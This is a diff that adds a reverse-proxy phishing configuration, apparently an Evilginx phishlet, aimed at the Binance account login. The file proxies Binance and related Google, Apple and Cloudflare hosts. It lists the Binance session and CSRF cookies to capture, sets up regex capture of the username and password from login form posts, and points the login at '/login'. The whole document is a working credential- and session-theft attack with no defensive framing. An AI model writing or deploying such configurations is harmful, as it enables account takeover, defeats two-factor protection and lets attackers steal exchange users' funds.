@@ -1,0 +1,139 @@
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'binance.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'bin', orig_sub: 'bin', domain: 'bnbstatic.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: '', domain: 'cdn.cookielaw.org', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sentry', orig_sub: 'o529943', domain: 'ingest.sentry.io', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'analytics', orig_sub: 'www', domain: 'google-analytics.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'tagmanager', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'saasexch.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'geo', orig_sub: 'geolocation', domain: 'onetrust.com', session: true, is_landing false, auto_filter: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'geetest.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'challenges', orig_sub: 'challenges', domain: 'cloudflare.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+
+
+  
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'appleid', orig_sub: 'appleid', domain: 'cdn-apple.com', session: true, is_landing: false, auto_filter: true}
+  
+
+sub_filters:
+  - {triggers_on: 'accounts.binance.com', orig_sub: '', domain: 'accounts.binance.com', search: 'mydomain.com', replace: 'target.com', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: 'accounts.binance.com'
+    keys: ['_ga_3WP50LGEEC']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['_gat_UA-162512367-1']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['_gat']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['_ga']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['_gcl_au']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['_gid']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['_uetsid']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['_uetvid']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['bnc-uuid']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['BNC_FV_KEY_EXPIRE']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['BNC_FV_KEY_T']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['BNC_FV_KEY']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['language']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['lang']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['OptanonAlertBoxClosed']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['OptanonConsent']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['sajssdk_2015_cross_new_user']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['se_gd']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['se_gsd']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['se_sd']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['sensorsdata2015jssdkcross']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['theme']
+    type: 'cookie'
+
+
+
+  - domain: 'accounts.binance.com'
+    keys: ['csrftoken']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['CSRFMD5']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['csrfmd5']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['cr00']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['d1og']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['f30l']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['r2o1']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['s9r1']
+    type: 'cookie'
+  - domain: 'accounts.binance.com'
+    keys: ['p20t']
+    type: 'cookie'
+
+
+
+
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'accounts.binance.com'
+  path: '/login'
